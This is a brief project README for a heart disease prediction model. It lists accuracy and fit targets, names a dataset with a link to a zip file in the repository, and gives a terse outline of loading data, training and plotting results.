# Project-1-Heart-Disease-AI07
Heart Disease Prediction
# Summary
This project targeted to had below criteria:

a. The model should reach at least 90% accuracy for both training and validation.

b. The model should be in good fit (no under or overfitting). When you reach criteria a,
   your model is considered not underfitting already. 
   
# Dataset

The dataset used in this project was dataset from David Lapp 
https://raw.githubusercontent.com/gitxbal/Project-1-Heart-Disease-AI07/main/Yengeese/A_Disease_Heart_Project_v1.7.zip

# Methodology

First we upload package that needed in this project
Then, we upload the dataset and printed out portion of the data

Next, we build model

 Fit the model with training and testing data
 
 # Result
 Plotted the validation accuracy and loss
